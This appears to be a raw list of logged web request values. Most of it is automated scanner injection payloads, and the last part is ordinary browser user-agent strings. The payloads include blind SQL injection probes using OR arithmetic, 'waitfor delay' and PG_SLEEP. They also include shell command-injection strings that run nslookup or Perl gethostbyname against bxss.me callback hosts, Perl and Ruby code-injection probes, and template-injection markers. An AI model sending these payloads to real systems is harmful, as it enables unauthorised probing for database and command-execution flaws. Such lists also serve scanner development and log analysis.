+;(nslookup hitnsaszoewwy4311c.bxss.me||perl -e "gethostbyname('hitnsaszoewwy4311c.bxss.me')")|(nslookup hitnsaszoewwy4311c.bxss.me||perl -e "gethostbyname('hitnsaszoewwy4311c.bxss.me')")&(nslookup hitnsaszoewwy4311c.bxss.me||perl -e "gethostbyname('hitnsaszoewwy4311c.bxss.me')")
+-1" OR 2 995-995-1=0 0 0 1 --
+-1 OR 2 435-435-1=0 0 0 1 --
+SK3EXVXP
+-1 OR 2 858-858-1=0 0 0 1
+-1 OR 2 107-107-1=0 0 0 1 --
+-1' OR 2 489-489-1=0 0 0 1 --
+-1 OR 2 908-908-1=0 0 0 1
+-1' OR 2 533-533-1=0 0 0 1 or 'Owkrtps1'='
+-1' OR 2 675-675-1=0 0 0 1 --
+-1" OR 2 134-134-1=0 0 0 1 --
+-1' OR 2 669-669-1=0 0 0 1 or 'FjQm56dP'='
+-1 OR 2 39-39-1=0 0 0 1 --
+-1" OR 2 463-463-1=0 0 0 1 --
+-1 OR 3 39-39-1=0 0 0 1 --
+-1 OR 3*2<(0 5 39-39) --
+-1 OR 2 839-839-1=0 0 0 1
+-1 OR 3 839-839-1=0 0 0 1
+-1' OR 2 320-320-1=0 0 0 1 --
+-1' OR 3 320-320-1=0 0 0 1 --
+-1' OR 2 768-768-1=0 0 0 1 or '4Yyk0m40'='
+-1' OR 3 768-768-1=0 0 0 1 or '4Yyk0m40'='
+-1" OR 2 720-720-1=0 0 0 1 --
+${10000372 10000459}
+H6skYp7U'; waitfor delay '0:0:15' --
+uaVfLlyC'; waitfor delay '0:0:15' --
+3G7BY5vL'); waitfor delay '0:0:15' --
+'.gethostbyname(lc('hitfo'.'yknjhnudcd12a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(103).chr(78).chr(112).chr(82).'
+".gethostbyname(lc("hitvu"."ohhqyjar439be.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(88).chr(98).chr(79)."
+2VKfPu0Q'; waitfor delay '0:0:15' --
+lW2jnzoj'); waitfor delay '0:0:15' --
+Ut6bPqni')); waitfor delay '0:0:15' --
+uxzFAkaL'); waitfor delay '0:0:15' --
+AHsEhzDR'; waitfor delay '0:0:15' --
+Qx35QhEC')); waitfor delay '0:0:15' --
+KQJZaZNa' OR 43=(SELECT 43 FROM PG_SLEEP(15))--
+6I6wQLog')); waitfor delay '0:0:15' --
+Fzjl71nm'); waitfor delay '0:0:15' --
+" "A".concat(70-3).concat(22*4).concat(103).concat(82).concat(116).concat(71) (require"socket" Socket.gethostbyname("hitsl" "yzmtthak3b502.bxss.me.")[3].to_s) "
+iAg9ZgMp' OR 771=(SELECT 771 FROM PG_SLEEP(15))--
+' 'A'.concat(70-3).concat(22*4).concat(100).concat(74).concat(120).concat(69) (require'socket' Socket.gethostbyname('hitbo' 'skocwpbr1b068.bxss.me.')[3].to_s) '
+YK14N2Di') OR 17=(SELECT 17 FROM PG_SLEEP(15))--
+qCahpSdQ' OR 644=(SELECT 644 FROM PG_SLEEP(15))--
+FKVPaaPk')); waitfor delay '0:0:15' --
+4WOgM847') OR 686=(SELECT 686 FROM PG_SLEEP(15))--
+0TkqkgzP')) OR 648=(SELECT 648 FROM PG_SLEEP(15))--
+5kbMeZQm') OR 410=(SELECT 410 FROM PG_SLEEP(15))--
+LaREWYTv' OR 913=(SELECT 913 FROM PG_SLEEP(15))--
+0N7zizFj')) OR 78=(SELECT 78 FROM PG_SLEEP(15))--
+1jqnBFqP')) OR 361=(SELECT 361 FROM PG_SLEEP(15))--
+@@2eRV0
+oUXISolU') OR 330=(SELECT 330 FROM PG_SLEEP(15))--
+@@eopKR
+T4WiQ6RI')) OR 837=(SELECT 837 FROM PG_SLEEP(15))--
+@@Q7OVy
+echo vqywkb$()\ atoirb\nz^xyu||a #' &echo vqywkb$()\ atoirb\nz^xyu||a #|" &echo vqywkb$()\ atoirb\nz^xyu||a #
+&echo ejfbvt$()\ hwpvgh\nz^xyu||a #' &echo ejfbvt$()\ hwpvgh\nz^xyu||a #|" &echo ejfbvt$()\ hwpvgh\nz^xyu||a #
+|echo oehorm$()\ bqjjyb\nz^xyu||a #' |echo oehorm$()\ bqjjyb\nz^xyu||a #|" |echo oehorm$()\ bqjjyb\nz^xyu||a #
+(nslookup hitsaopoiejiu2fb0c.bxss.me||perl -e "gethostbyname('hitsaopoiejiu2fb0c.bxss.me')")
+$(nslookup hitxovehjqyst0d986.bxss.me||perl -e "gethostbyname('hitxovehjqyst0d986.bxss.me')")
+&(nslookup hitgvmxaxgtpw642b9.bxss.me||perl -e "gethostbyname('hitgvmxaxgtpw642b9.bxss.me')")&'\"`0&(nslookup hitgvmxaxgtpw642b9.bxss.me||perl -e "gethostbyname('hitgvmxaxgtpw642b9.bxss.me')")&`'
+@@dzZWF
+|(nslookup hitdwsuekalyp4b9ca.bxss.me||perl -e "gethostbyname('hitdwsuekalyp4b9ca.bxss.me')")
+`(nslookup hitbdngrmzzgne1efd.bxss.me||perl -e "gethostbyname('hitbdngrmzzgne1efd.bxss.me')")`
+;(nslookup hitlnygjcpqsbfb286.bxss.me||perl -e "gethostbyname('hitlnygjcpqsbfb286.bxss.me')")|(nslookup hitlnygjcpqsbfb286.bxss.me||perl -e "gethostbyname('hitlnygjcpqsbfb286.bxss.me')")&(nslookup hitlnygjcpqsbfb286.bxss.me||perl -e "gethostbyname('hitlnygjcpqsbfb286.bxss.me')")
+${9999735 10000454}
+'.gethostbyname(lc('hitjs'.'ddgqczvzefb0d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(84).chr(115).chr(76).'
+".gethostbyname(lc("hitti"."tfoejfku5412d.bxss.me."))."A".chr(67).chr(hex("58")).chr(109).chr(77).chr(116).chr(71)."
+" "A".concat(70-3).concat(22*4).concat(121).concat(88).concat(108).concat(72) (require"socket" Socket.gethostbyname("hitak" "gpmidxjz61f38.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(111).concat(76).concat(108).concat(74) (require'socket' Socket.gethostbyname('hitrg' 'psjqpnur6592d.bxss.me.')[3].to_s) '
+echo lfffnd$()\ zcjmfg\nz^xyu||a #' &echo lfffnd$()\ zcjmfg\nz^xyu||a #|" &echo lfffnd$()\ zcjmfg\nz^xyu||a #
+&echo uvlhvi$()\ mussap\nz^xyu||a #' &echo uvlhvi$()\ mussap\nz^xyu||a #|" &echo uvlhvi$()\ mussap\nz^xyu||a #
+|echo poavpt$()\ zvifia\nz^xyu||a #' |echo poavpt$()\ zvifia\nz^xyu||a #|" |echo poavpt$()\ zvifia\nz^xyu||a #
+(nslookup hitzpkepbyryu7161d.bxss.me||perl -e "gethostbyname('hitzpkepbyryu7161d.bxss.me')")
+$(nslookup hitzgtjaiajzlf3707.bxss.me||perl -e "gethostbyname('hitzgtjaiajzlf3707.bxss.me')")
+&(nslookup hitjhpbonpqll5ab45.bxss.me||perl -e "gethostbyname('hitjhpbonpqll5ab45.bxss.me')")&'\"`0&(nslookup hitjhpbonpqll5ab45.bxss.me||perl -e "gethostbyname('hitjhpbonpqll5ab45.bxss.me')")&`'
+|(nslookup hitgthmuhljqk73a52.bxss.me||perl -e "gethostbyname('hitgthmuhljqk73a52.bxss.me')")
+`(nslookup hitwxjewjbwtc6c264.bxss.me||perl -e "gethostbyname('hitwxjewjbwtc6c264.bxss.me')")`
+;(nslookup hitqeepitzrnb05a0f.bxss.me||perl -e "gethostbyname('hitqeepitzrnb05a0f.bxss.me')")|(nslookup hitqeepitzrnb05a0f.bxss.me||perl -e "gethostbyname('hitqeepitzrnb05a0f.bxss.me')")&(nslookup hitqeepitzrnb05a0f.bxss.me||perl -e "gethostbyname('hitqeepitzrnb05a0f.bxss.me')")
+${9999124 9999593}
+'.gethostbyname(lc('hitkp'.'vyrlhdcfb429f.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(66).chr(98).chr(68).'
+".gethostbyname(lc("hitnc"."ceauduek346ab.bxss.me."))."A".chr(67).chr(hex("58")).chr(100).chr(66).chr(116).chr(77)."
+" "A".concat(70-3).concat(22*4).concat(103).concat(68).concat(117).concat(79) (require"socket" Socket.gethostbyname("hitat" "odfujinsca2c1.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(111).concat(87).concat(104).concat(78) (require'socket' Socket.gethostbyname('hitnq' 'isneacyr479e4.bxss.me.')[3].to_s) '
+1pHT8bLS4O
+1BdokngP4zO
+1Lq5DAzO
+echo tkeiic$()\ lrpefu\nz^xyu||a #' &echo tkeiic$()\ lrpefu\nz^xyu||a #|" &echo tkeiic$()\ lrpefu\nz^xyu||a #
+&echo ampnrz$()\ okxglw\nz^xyu||a #' &echo ampnrz$()\ okxglw\nz^xyu||a #|" &echo ampnrz$()\ okxglw\nz^xyu||a #
+|echo atmpwx$()\ dmrqfh\nz^xyu||a #' |echo atmpwx$()\ dmrqfh\nz^xyu||a #|" |echo atmpwx$()\ dmrqfh\nz^xyu||a #
+(nslookup hitoiwwhqklej65317.bxss.me||perl -e "gethostbyname('hitoiwwhqklej65317.bxss.me')")
+$(nslookup hitxigatwbfim0e8f8.bxss.me||perl -e "gethostbyname('hitxigatwbfim0e8f8.bxss.me')")
+&(nslookup hitmzdtzcwrzp88f60.bxss.me||perl -e "gethostbyname('hitmzdtzcwrzp88f60.bxss.me')")&'\"`0&(nslookup hitmzdtzcwrzp88f60.bxss.me||perl -e "gethostbyname('hitmzdtzcwrzp88f60.bxss.me')")&`'
+|(nslookup hitsivphfbtak19efb.bxss.me||perl -e "gethostbyname('hitsivphfbtak19efb.bxss.me')")
+`(nslookup hitzuaskngbtj29ee5.bxss.me||perl -e "gethostbyname('hitzuaskngbtj29ee5.bxss.me')")`
+${9999433 10000297}
+;(nslookup hitajxrgkktyg63bfd.bxss.me||perl -e "gethostbyname('hitajxrgkktyg63bfd.bxss.me')")|(nslookup hitajxrgkktyg63bfd.bxss.me||perl -e "gethostbyname('hitajxrgkktyg63bfd.bxss.me')")&(nslookup hitajxrgkktyg63bfd.bxss.me||perl -e "gethostbyname('hitajxrgkktyg63bfd.bxss.me')")
+'.gethostbyname(lc('hitdy'.'jgqveigh80dac.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(108).chr(84).chr(104).chr(71).'
+".gethostbyname(lc("hitgp"."yenqpvvc3e00a.bxss.me."))."A".chr(67).chr(hex("58")).chr(103).chr(82).chr(114).chr(66)."
+" "A".concat(70-3).concat(22*4).concat(114).concat(77).concat(109).concat(71) (require"socket" Socket.gethostbyname("hitvk" "ocqkgxle596a4.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(122).concat(65).concat(116).concat(77) (require'socket' Socket.gethostbyname('hittg' 'xhtccqwn91c8b.bxss.me.')[3].to_s) '
+7uVj9pOv
+-1 OR 2 842-842-1=0 0 0 1 --
+-1 OR 2 506-506-1=0 0 0 1
+S8bkG32x
+-1' OR 2 493-493-1=0 0 0 1 --
+-1 OR 2 751-751-1=0 0 0 1 --
+-1' OR 2 253-253-1=0 0 0 1 or '3aetJh70'='
+-1 OR 2 176-176-1=0 0 0 1
+-1" OR 2 759-759-1=0 0 0 1 --
+-1' OR 2 577-577-1=0 0 0 1 --
+echo rnecwx$()\ jdyqdu\nz^xyu||a #' &echo rnecwx$()\ jdyqdu\nz^xyu||a #|" &echo rnecwx$()\ jdyqdu\nz^xyu||a #
+-1' OR 2 502-502-1=0 0 0 1 or 'IJWx0IId'='
+&echo japhws$()\ nakqtn\nz^xyu||a #' &echo japhws$()\ nakqtn\nz^xyu||a #|" &echo japhws$()\ nakqtn\nz^xyu||a #
+-1" OR 2 950-950-1=0 0 0 1 --
+|echo imvwmx$()\ mptfzs\nz^xyu||a #' |echo imvwmx$()\ mptfzs\nz^xyu||a #|" |echo imvwmx$()\ mptfzs\nz^xyu||a #
+(nslookup hitgjfcsdfcuv35020.bxss.me||perl -e "gethostbyname('hitgjfcsdfcuv35020.bxss.me')")
+$(nslookup hitssnkpsdlaf76324.bxss.me||perl -e "gethostbyname('hitssnkpsdlaf76324.bxss.me')")
+&(nslookup hitiphyckcqxy42980.bxss.me||perl -e "gethostbyname('hitiphyckcqxy42980.bxss.me')")&'\"`0&(nslookup hitiphyckcqxy42980.bxss.me||perl -e "gethostbyname('hitiphyckcqxy42980.bxss.me')")&`'
+|(nslookup hitbhslfuuwcda63ca.bxss.me||perl -e "gethostbyname('hitbhslfuuwcda63ca.bxss.me')")
+`(nslookup hitguemlpuesz7a898.bxss.me||perl -e "gethostbyname('hitguemlpuesz7a898.bxss.me')")`
+;(nslookup hitnuiybowuoc8b5ed.bxss.me||perl -e "gethostbyname('hitnuiybowuoc8b5ed.bxss.me')")|(nslookup hitnuiybowuoc8b5ed.bxss.me||perl -e "gethostbyname('hitnuiybowuoc8b5ed.bxss.me')")&(nslookup hitnuiybowuoc8b5ed.bxss.me||perl -e "gethostbyname('hitnuiybowuoc8b5ed.bxss.me')")
+${9999978 9999235}
+85zZeinV
+-1 OR 2 576-576-1=0 0 0 1 --
+-1 OR 2 39-39-1=0 0 0 1
+-1' OR 2 756-756-1=0 0 0 1 --
+-1' OR 2 98-98-1=0 0 0 1 or 'T1lQtDjJ'='
+-1" OR 2 670-670-1=0 0 0 1 --
+Iw0wv8px'; waitfor delay '0:0:15' --
+'.gethostbyname(lc('hitla'.'vfbruxhjdc446.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(90).chr(106).chr(71).'
+A30PDbIl'; waitfor delay '0:0:15' --
+".gethostbyname(lc("hitjc"."rjkwvsws7982a.bxss.me."))."A".chr(67).chr(hex("58")).chr(98).chr(68).chr(107).chr(85)."
+rNqGhmg8'); waitfor delay '0:0:15' --
+RXsfVJbx'); waitfor delay '0:0:15' --
+K5cUpxdp')); waitfor delay '0:0:15' --
+" "A".concat(70-3).concat(22*4).concat(114).concat(73).concat(103).concat(86) (require"socket" Socket.gethostbyname("hitwj" "wuaxlpjl5e96b.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(118).concat(79).concat(117).concat(89) (require'socket' Socket.gethostbyname('hitst' 'igmolpxp97dc0.bxss.me.')[3].to_s) '
+eptXerN4')); waitfor delay '0:0:15' --
+y9nnXNsJ' OR 677=(SELECT 677 FROM PG_SLEEP(15))--
+RfaUXi56' OR 305=(SELECT 305 FROM PG_SLEEP(15))--
+yeGiVGEl'; waitfor delay '0:0:15' --
+xAaY8YRm') OR 723=(SELECT 723 FROM PG_SLEEP(15))--
+batMhd4S') OR 845=(SELECT 845 FROM PG_SLEEP(15))--
+VawZAqtW'); waitfor delay '0:0:15' --
+iRW9zkoH')) OR 684=(SELECT 684 FROM PG_SLEEP(15))--
+goCaQ9TD')) OR 533=(SELECT 533 FROM PG_SLEEP(15))--
+3xWPJgjE')); waitfor delay '0:0:15' --
+@@ZJ8Ot
+0Gb9K4wE' OR 322=(SELECT 322 FROM PG_SLEEP(15))--
+echo soxnqv$()\ zlnhhe\nz^xyu||a #' &echo soxnqv$()\ zlnhhe\nz^xyu||a #|" &echo soxnqv$()\ zlnhhe\nz^xyu||a #
+&echo yiastz$()\ gijqvg\nz^xyu||a #' &echo yiastz$()\ gijqvg\nz^xyu||a #|" &echo yiastz$()\ gijqvg\nz^xyu||a #
+@@W6k7p
+|echo lwyrdd$()\ hngypt\nz^xyu||a #' |echo lwyrdd$()\ hngypt\nz^xyu||a #|" |echo lwyrdd$()\ hngypt\nz^xyu||a #
+(nslookup hitgaasijsqamf8567.bxss.me||perl -e "gethostbyname('hitgaasijsqamf8567.bxss.me')")
+JCv3Gvbk') OR 177=(SELECT 177 FROM PG_SLEEP(15))--
+$(nslookup hitlmjlhddzwyced12.bxss.me||perl -e "gethostbyname('hitlmjlhddzwyced12.bxss.me')")
+&(nslookup hityozetflzzv491c5.bxss.me||perl -e "gethostbyname('hityozetflzzv491c5.bxss.me')")&'\"`0&(nslookup hityozetflzzv491c5.bxss.me||perl -e "gethostbyname('hityozetflzzv491c5.bxss.me')")&`'
+|(nslookup hitxtwdwsyzoic3438.bxss.me||perl -e "gethostbyname('hitxtwdwsyzoic3438.bxss.me')")
+`(nslookup hithhlgoaypeb25cfd.bxss.me||perl -e "gethostbyname('hithhlgoaypeb25cfd.bxss.me')")`
+;(nslookup hitxbuwgfddlfbbc28.bxss.me||perl -e "gethostbyname('hitxbuwgfddlfbbc28.bxss.me')")|(nslookup hitxbuwgfddlfbbc28.bxss.me||perl -e "gethostbyname('hitxbuwgfddlfbbc28.bxss.me')")&(nslookup hitxbuwgfddlfbbc28.bxss.me||perl -e "gethostbyname('hitxbuwgfddlfbbc28.bxss.me')")
+${9999922 10000228}
+E3UPzQgB')) OR 328=(SELECT 328 FROM PG_SLEEP(15))--
+'.gethostbyname(lc('hittc'.'mnnvvjzl25050.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(100).chr(84).chr(97).chr(73).'
+".gethostbyname(lc("hitft"."tzoypmose454f.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(75).chr(100).chr(89)."
+@@wSci0
+" "A".concat(70-3).concat(22*4).concat(109).concat(87).concat(122).concat(72) (require"socket" Socket.gethostbyname("hitfe" "zvdrdkdw02610.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(116).concat(66).concat(103).concat(81) (require'socket' Socket.gethostbyname('hitbz' 'iwoduywhb91a0.bxss.me.')[3].to_s) '
+1CMEGMnYNIO
+1D3Z95H7N8O
+echo plhgje$()\ canjfe\nz^xyu||a #' &echo plhgje$()\ canjfe\nz^xyu||a #|" &echo plhgje$()\ canjfe\nz^xyu||a #
+&echo qmqhhx$()\ ywzzyx\nz^xyu||a #' &echo qmqhhx$()\ ywzzyx\nz^xyu||a #|" &echo qmqhhx$()\ ywzzyx\nz^xyu||a #
+|echo nltnoc$()\ frqvdo\nz^xyu||a #' |echo nltnoc$()\ frqvdo\nz^xyu||a #|" |echo nltnoc$()\ frqvdo\nz^xyu||a #
+(nslookup hitxlxfkkbzom2c853.bxss.me||perl -e "gethostbyname('hitxlxfkkbzom2c853.bxss.me')")
+$(nslookup hitqensvqgdajd7db9.bxss.me||perl -e "gethostbyname('hitqensvqgdajd7db9.bxss.me')")
+&(nslookup hitheezooaife9811f.bxss.me||perl -e "gethostbyname('hitheezooaife9811f.bxss.me')")&'\"`0&(nslookup hitheezooaife9811f.bxss.me||perl -e "gethostbyname('hitheezooaife9811f.bxss.me')")&`'
+|(nslookup hittcqscoutdza8d8d.bxss.me||perl -e "gethostbyname('hittcqscoutdza8d8d.bxss.me')")
+`(nslookup hitwcawlfdvhi0e857.bxss.me||perl -e "gethostbyname('hitwcawlfdvhi0e857.bxss.me')")`
+;(nslookup hittfarjmbgta556c5.bxss.me||perl -e "gethostbyname('hittfarjmbgta556c5.bxss.me')")|(nslookup hittfarjmbgta556c5.bxss.me||perl -e "gethostbyname('hittfarjmbgta556c5.bxss.me')")&(nslookup hittfarjmbgta556c5.bxss.me||perl -e "gethostbyname('hittfarjmbgta556c5.bxss.me')")
+${9999988 9999477}
+'.gethostbyname(lc('hites'.'xlecjhwb71ce9.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(106).chr(73).chr(122).chr(75).'
+".gethostbyname(lc("hitpy"."ucxdpopo2137a.bxss.me."))."A".chr(67).chr(hex("58")).chr(98).chr(74).chr(109).chr(77)."
+" "A".concat(70-3).concat(22*4).concat(112).concat(72).concat(108).concat(65) (require"socket" Socket.gethostbyname("hitiv" "xbvacgaf611fe.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(106).concat(89).concat(99).concat(76) (require'socket' Socket.gethostbyname('hitdy' 'rjbnvgbdadeb1.bxss.me.')[3].to_s) '
+${10000351 9999459}
+echo brfcdx$()\ dbpcgy\nz^xyu||a #' &echo brfcdx$()\ dbpcgy\nz^xyu||a #|" &echo brfcdx$()\ dbpcgy\nz^xyu||a #
+&echo lfjyfl$()\ qddgtu\nz^xyu||a #' &echo lfjyfl$()\ qddgtu\nz^xyu||a #|" &echo lfjyfl$()\ qddgtu\nz^xyu||a #
+|echo zwfixp$()\ sogoig\nz^xyu||a #' |echo zwfixp$()\ sogoig\nz^xyu||a #|" |echo zwfixp$()\ sogoig\nz^xyu||a #
+(nslookup hiticduuxuqlsb78dd.bxss.me||perl -e "gethostbyname('hiticduuxuqlsb78dd.bxss.me')")
+$(nslookup hitirveuvpwsma2a11.bxss.me||perl -e "gethostbyname('hitirveuvpwsma2a11.bxss.me')")
+'.gethostbyname(lc('hitsg'.'vdsajfjz01af4.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(105).chr(89).chr(121).chr(70).'
+".gethostbyname(lc("hittv"."zbloqsyv9ac07.bxss.me."))."A".chr(67).chr(hex("58")).chr(100).chr(69).chr(116).chr(78)."
+&(nslookup hitchdsuwrxzr86912.bxss.me||perl -e "gethostbyname('hitchdsuwrxzr86912.bxss.me')")&'\"`0&(nslookup hitchdsuwrxzr86912.bxss.me||perl -e "gethostbyname('hitchdsuwrxzr86912.bxss.me')")&`'
+|(nslookup hitduahvvbhui7491b.bxss.me||perl -e "gethostbyname('hitduahvvbhui7491b.bxss.me')")
+`(nslookup hityizqxbzqne6023f.bxss.me||perl -e "gethostbyname('hityizqxbzqne6023f.bxss.me')")`
+;(nslookup hitxhdumqhblh22574.bxss.me||perl -e "gethostbyname('hitxhdumqhblh22574.bxss.me')")|(nslookup hitxhdumqhblh22574.bxss.me||perl -e "gethostbyname('hitxhdumqhblh22574.bxss.me')")&(nslookup hitxhdumqhblh22574.bxss.me||perl -e "gethostbyname('hitxhdumqhblh22574.bxss.me')")
+" "A".concat(70-3).concat(22*4).concat(121).concat(65).concat(103).concat(86) (require"socket" Socket.gethostbyname("hithy" "kcpicbmc456a9.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(119).concat(83).concat(97).concat(89) (require'socket' Socket.gethostbyname('hitsu' 'lvgawflo6bf54.bxss.me.')[3].to_s) '
+gxRYBgKs
+-1 OR 2 66-66-1=0 0 0 1 --
+-1 OR 2 802-802-1=0 0 0 1
+-1' OR 2 431-431-1=0 0 0 1 --
+-1' OR 2 675-675-1=0 0 0 1 or '150uFFkv'='
+-1" OR 2 326-326-1=0 0 0 1 --
+OD03RG3K'; waitfor delay '0:0:15' --
+TXZ4AjCy'); waitfor delay '0:0:15' --
+iFvtVTMG')); waitfor delay '0:0:15' --
+jJ1Q7oX4' OR 153=(SELECT 153 FROM PG_SLEEP(15))--
+C78OPCH6') OR 750=(SELECT 750 FROM PG_SLEEP(15))--
+U29XgE7e')) OR 997=(SELECT 997 FROM PG_SLEEP(15))--
+@@xMZsh
+Mozilla/5.0 (Linux; Android 10; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; M2006C3LI Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 GSA/12.23.16.23.arm
+Mozilla/5.0 (Linux; Android 8.0.0; LND-AL30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 (.NET CLR 3.5.30729)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1
+Mozilla/5.0 (Linux; Android 11; GM1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
+Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3
+Mozilla/5.0 (Linux; Android 7.0; SM-T819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; BE2012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15; rv:88.0) Gecko/20100101 Firefox/88.0
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
+Mozilla/5.0 (Windows NT 5.1; rv:88.0) Gecko/20100101 Firefox/88.0
+Mozilla/5.0 (Linux; Android 8.1.0; SM-T580 Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 GSA/12.24.10.23.arm
+Mozilla/5.0 (Linux; Android 11; V2040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 9; vivo 1723 Build/PKQ1.190118.001)
+Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5
+Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36
+Mozilla/5.0 (Linux; U; Android 8.1.0; Lenovo TB-8704X Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Safari/537.36 OPR/53.1.2254.55490
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36
+Mozilla/5.0 (Linux; arm; Android 10; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.53.1 YaSearchBrowser/21.53.1 BroPP/1.0 SA/3 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:67.0) Gecko/20100101 Firefox/67.0
+Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36
+mukewang/7.2.0 (iPhone; iOS 12.3.1; Scale/2.00) webview
+Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1
+Mozilla/5.0 (Linux; Android 9; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36
+PHPCrawl
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3217.90 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
+Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2789.78 Safari/537.36
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2186.69 Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.107 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-A205U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.88 Mobile Safari/537.36 GSA/12.22.8.23.arm64
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
+Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0
+Mozilla/5.0 (Linux; Android 10; vivo 1806 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.24.10.23.arm64
+Mozilla/5.0 (Linux; Android 11; SM-A516U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; LG-H815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; moto g(6) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4068.4 Safari/537.36
